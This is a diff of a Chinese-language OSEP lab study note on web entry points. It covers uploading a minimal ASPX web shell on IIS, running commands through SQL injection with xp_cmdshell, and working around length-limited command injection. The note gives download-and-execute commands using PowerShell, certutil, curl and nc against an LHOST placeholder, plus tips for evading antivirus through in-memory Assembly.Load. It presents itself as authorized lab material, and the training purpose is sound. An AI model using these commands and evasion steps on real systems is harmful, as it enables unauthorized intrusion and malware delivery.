@@ -1,34 +1,30 @@
-::: warning Authorized use only
-For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
+::: warning 仅限授权使用
+本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
 :::
 
-# Module 10 — Web 入口 —— ASPX Web Shell 与注入后的下载/执行
+# 模块 M10：Web 入口 —— ASPX Web Shell 与注入后的下载/执行
 
-Prove RCE with a tiny page. Swap downloaders when one is blocked. Watch command length.
+> 覆盖场景：14、15、16
+> > 教材依据：第 8–9 章（托管加载）、第 24 章（Web 与服务账户）、C2/C6（Web 入口）
+> 前置依赖：可上传文件或存在注入点的 Web 服务；IIS/.NET（ASPX）或 PHP/JSP 运行时；攻击机有可被目标访问的投递地址
 
-Switch to **中文** in the header for the original full narrative. Lab listings on this page are complete.
-
-> Covers scenarios：14、15、16
-> > Course mapping：第 8–9 章（托管加载）、第 24 章（Web 与服务账户）、C2/C6（Web 入口）
-> Prerequisites：可上传文件或存在注入点的 Web 服务；IIS/.NET（ASPX）或 PHP/JSP 运行时；attacker box有可被目标访问的投递地址
-
-**Rules for this module**：
+**本模块的共同原则**：
 1. **Web 入口的身份通常很低**（IIS 应用池账户、`NT AUTHORITY\NETWORK SERVICE`），拿到后第一件事是 `whoami /priv`——是否有 `SeImpersonatePrivilege` 决定你能不能立刻提权。
 2. **公开 Web Shell 一定被杀**——精简到只剩必要功能，第二阶段独立可替换。
 3. **命令长度/引号是隐形杀手**——注入点经常截断复杂命令，短第一阶段 + 分离执行几乎总是更稳。
 
 ---
 
-## Scenario 14：网站允许上传 ASPX，后台是 IIS，目标安装了杀毒软件
+## 场景 14：网站允许上传 ASPX，后台是 IIS，目标安装了杀毒软件
 
-**Situation**：上传后的 ASPX 会被服务器解析，简单命令执行可用；但公开 Web Shell 或上传的 EXE 被查杀；当前身份是应用池账户。
+**场景回顾**：上传后的 ASPX 会被服务器解析，简单命令执行可用；但公开 Web Shell 或上传的 EXE 被查杀；当前身份是应用池账户。
 
-**Assumptions**：
+**前提与假设**：
 - 上传目录可被 Web 访问，且允许 `.aspx`（或可改名为 `.ashx`/`.asmx`/`.config`）。
 - 目标装了 AV（对落地文件与常见 Web Shell 特征有签名）。
 - 已确认当前身份为应用池账户（权限有限但常带 `SeImpersonatePrivilege`）。
 
-**Prepare (attacker)**：
+**准备（攻击机侧）**：
 1. 准备三份材料：
    | 文件 | 用途 |
    |---|---|
@@ -41,7 +37,7 @@ Switch to **中文** in the header for the original full narrative. Lab listings
    python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads
    ```
 
-**Procedure**：
+**执行步骤**：
 1. 上传精简 ASPX，访问一次，确认能执行：
    ```text
    GET /upload/shell.aspx?cmd=whoami
@@ -53,9 +49,9 @@ Switch to **中文** in the header for the original full narrative. Lab listings
    ```
 3. 若被 AV 查杀 → 精简特征：去掉注释、去掉 `eval`、把命令关键字拆分/编码；或换扩展名与路径。
 4. 上传 EXE 被查杀 → 改为**内存加载**：ASPX 只负责把第二阶段字节（Base64）`Assembly.Load` 进 IIS 进程，不落地。
-5. 拿到稳定执行后：若有 `SeImpersonatePrivilege` → 转 [06-uac-windows-privesc](/modules/06-uac-windows-privesc) 场景 26。
+5. 拿到稳定执行后：若有 `SeImpersonatePrivilege` → 转 [06-uac-windows-privesc](/zh/modules/06-uac-windows-privesc) 场景 26。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m10-minimal-exec.aspx` | 精简命令执行 | `cmd` 参数 |
@@ -591,28 +587,28 @@ md5sum /tmp/.PAYLOAD          # Linux 目标
 | `m09-https-listener.sh` | 需要 HTTPS 投递时起 TLS 监听 |
 ````
 
-**Verify**：HTTP 200 且返回命令输出；`whoami` 显示应用池账户；`tasklist` 中出现 `w3wp.exe`（ASPX 在 w3wp 进程内执行）。
+**验证**：HTTP 200 且返回命令输出；`whoami` 显示应用池账户；`tasklist` 中出现 `w3wp.exe`（ASPX 在 w3wp 进程内执行）。
 
-**If it fails**：
+**失败分支与备选**：
 1. **ASPX 被查杀** → 精简 + 编码；或改用 `.ashx`/`.asmx`；或上传 `.config` 触发解析（视环境）。
 2. **EXE 被查杀** → 内存加载（`Assembly.Load`），或用 PowerShell 反射（若 w3wp 允许）。
 3. **上传被限制**（扩展名白名单） → 找其它上传点、解析漏洞、或注入点（场景 15/16）。
 4. **应用池账户权限太低且无 SeImpersonate** → 找同服务器上的其它服务账户（IIS 配置、连接字符串里的凭据）。
 
-**Exam notes / OPSEC**：Web Shell 只当"执行入口"，所有重活交给独立第二阶段；这样每次被查杀只需要换一个文件，不用重新找上传点。
+**考试注意 / OPSEC**：Web Shell 只当"执行入口"，所有重活交给独立第二阶段；这样每次被查杀只需要换一个文件，不用重新找上传点。
 
 ---
 
-## Scenario 15：经典 ASP 网站存在 SQL 注入，可以执行系统命令，但下载器被拦
+## 场景 15：经典 ASP 网站存在 SQL 注入，可以执行系统命令，但下载器被拦
 
-**Situation**：已通过数据库获得命令执行，但用某种系统下载工具失败，换另一种却可以下载同一个文件。→ 准备的是**传输备选路线**，不是重新准备注入工具。
+**场景回顾**：已通过数据库获得命令执行，但用某种系统下载工具失败，换另一种却可以下载同一个文件。→ 准备的是**传输备选路线**，不是重新准备注入工具。
 
-**Assumptions**：
+**前提与假设**：
 - 已能通过注入点执行系统命令（`xp_cmdshell` 或等效）。
 - 目标可出网，但某些下载工具被应用控制/AV/代理拦截。
-- 已有一个Verify过的 EXE/脚本作为第二阶段。
+- 已有一个验证过的 EXE/脚本作为第二阶段。
 
-**Prepare (attacker)**：准备下载器备选矩阵（`m10-download-fallbacks.md`）
+**准备（攻击机侧）**：准备下载器备选矩阵（`m10-download-fallbacks.md`）
 
 | 优先级 | 工具 | 命令模板 | 备注 |
 |---|---|---|---|
@@ -622,38 +618,38 @@ md5sum /tmp/.PAYLOAD          # Linux 目标
 | 4 | PowerShell | `powershell -nop -w hidden -c "IWR -Uri http://LHOST/p.exe -OutFile C:\Windows\Temp\p.exe"` | 注意 AMSI |
 | 5 | `wget`/`nc` | `nc LHOST 80 > p.exe`（需交互） | 最后手段 |
 
-**Procedure**：
+**执行步骤**：
 1. 先确认出网：注入点执行 `curl -s -o nul http://LHOST/ping`（我方日志出现即成功）。
 2. 按矩阵顺序试下载器，每次换一个，**只改一个变量**。
-3. 下载完成后校验：`certutil -hashfile C:\Windows\Temp\p.exe MD5` 与attacker box一致。
+3. 下载完成后校验：`certutil -hashfile C:\Windows\Temp\p.exe MD5` 与攻击机一致。
 4. 再执行；执行被拦 → 转 `docs/05` 场景 18/19 的免杀/行为处理。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m10-download-fallbacks.md` | 下载器备选矩阵与命令 | LHOST/URL |
 | `m10-minimal-exec.aspx` | 有 Web Shell 时的替代执行通道 | `cmd` |
 
-**Verify**：投递服务日志出现目标 IP 的请求；目标侧文件存在且哈希一致；执行后有回连或输出。
+**验证**：投递服务日志出现目标 IP 的请求；目标侧文件存在且哈希一致；执行后有回连或输出。
 
-**If it fails**：
+**失败分支与备选**：
 1. **所有下载器都被拦** → 改用"上传"通道（Web Shell/上传点）或内嵌 Base64 分段写入。
-2. **只允许特定域名出网** → 域前置 / 代理（[09-c2-egress-channels](/modules/09-c2-egress-channels)）。
+2. **只允许特定域名出网** → 域前置 / 代理（[09-c2-egress-channels](/zh/modules/09-c2-egress-channels)）。
 3. **命令被转义/截断** → 换短命令（场景 16）。
 
-**Exam notes / OPSEC**：下载器失败**不代表网络不通**——先看投递日志，区分"没发起请求"（工具被拦）与"请求了但没回来"（网络/代理问题）。
+**考试注意 / OPSEC**：下载器失败**不代表网络不通**——先看投递日志，区分"没发起请求"（工具被拦）与"请求了但没回来"（网络/代理问题）。
 
 ---
 
-## Scenario 16：Web 命令注入只接受很短的命令
+## 场景 16：Web 命令注入只接受很短的命令
 
-**Situation**：内部页面提供 ping 等功能，存在命令注入，但参数长度有限，复杂引号和多层命令容易被截断。
+**场景回顾**：内部页面提供 ping 等功能，存在命令注入，但参数长度有限，复杂引号和多层命令容易被截断。
 
-**Assumptions**：
+**前提与假设**：
 - 注入点存在，但长度/字符集受限（常见 <100 字符）。
 - 目标可出网（否则走内嵌）。
 
-**Prepare (attacker)**：
+**准备（攻击机侧）**：
 1. 准备**极短的第一阶段**（把长命令换成"下载一个脚本再执行"）：
    ```text
    # 先只下载（约 40 字符）
@@ -664,27 +660,27 @@ md5sum /tmp/.PAYLOAD          # Linux 目标
 2. 准备适合目标解释器的编码参数版本（Base64 传参、避免引号）。
 3. 第二阶段脚本预先放好，文件名尽量短（`a`、`b`）。
 
-**Procedure**：
+**执行步骤**：
 1. 先测长度上限：逐步加长无害命令（`echo AAAA...`）确定边界。
 2. 用"下载 + 执行"两段式：第一步只写文件，第二步只执行。
 3. 每步都通过投递日志确认（目标是否真的发起了请求）。
 4. 若引号被截断 → 改用 Base64/十六进制参数，或把内容写进文件后执行。
 5. 若长度仍不够 → 用重定向拼接多段（`>a`、`>>a`）分多次写入。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m10-download-fallbacks.md` | 短命令下载模板 | LHOST |
 | `m10-minimal-exec.aspx` | 有 Web Shell 时的长命令通道 | `cmd` |
 
-**Verify**：投递日志按顺序出现请求；目标侧文件存在；执行后有回连/输出。
+**验证**：投递日志按顺序出现请求；目标侧文件存在；执行后有回连/输出。
 
-**If it fails**：
+**失败分支与备选**：
 1. **两段式仍被截断** → 用更短的下载器（`bitsadmin /transfer` 也长；优先 `curl -o a http://LHOST/a`）。
 2. **目标无出网** → 内嵌 Base64（但受长度限制，需要多段拼接）。
 3. **注入点过滤关键字**（`curl`/`certutil` 被过滤） → 换等价工具或编码参数。
 
-**Exam notes / OPSEC**：先花两分钟测长度上限，比反复猜要快得多；文件名越短越好。
+**考试注意 / OPSEC**：先花两分钟测长度上限，比反复猜要快得多；文件名越短越好。
 
 ---
 
